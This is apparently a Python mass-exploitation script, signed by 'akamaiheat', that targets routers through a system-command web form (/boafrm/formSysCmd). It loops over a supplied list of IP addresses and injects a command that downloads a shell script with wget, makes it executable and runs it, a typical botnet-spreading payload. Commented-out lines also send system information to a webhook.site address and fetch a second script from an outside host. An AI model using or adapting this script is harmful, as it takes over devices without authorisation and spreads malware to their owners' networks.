import requests
import sys 
print("written by akamaiheat")
iplist = sys.argv[1]
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://192.168.10.253',
    'Connection': 'close',
    'Referer': 'http://192.168.10.253/setok.htm',
    'Upgrade-Insecure-Requests': '1'
}
cmd="wget+http:///snype.sh;chmod+777+snype.sh;./snype.sh"
with open(iplist, 'r') as f:
    ip_list = f.read().splitlines()
#cmd="uname+-a+>test;curl+-d+test+https://webhook.site/2c4fc03c-5d79-444f-98a8-27c3f8ac10fb"
#cmd="wget+http://133.29/arch.sh;chmod+777+arch.sh./arch.sh"
for ip in ip_list:
    try:
        url = f'http://{ip}:5555/boafrm/formSysCmd'
    #data = {
   #     'sysCmd='+cmd
   # }
        data = bytes(f'sysCmd={cmd}'.format(ip), encoding='utf-8')
        response = requests.post(url, headers=headers, data=data)

        print(f'run at {ip}:')
 ##   print(response.status_code)
  #  print(response.text)
    except:
          pass
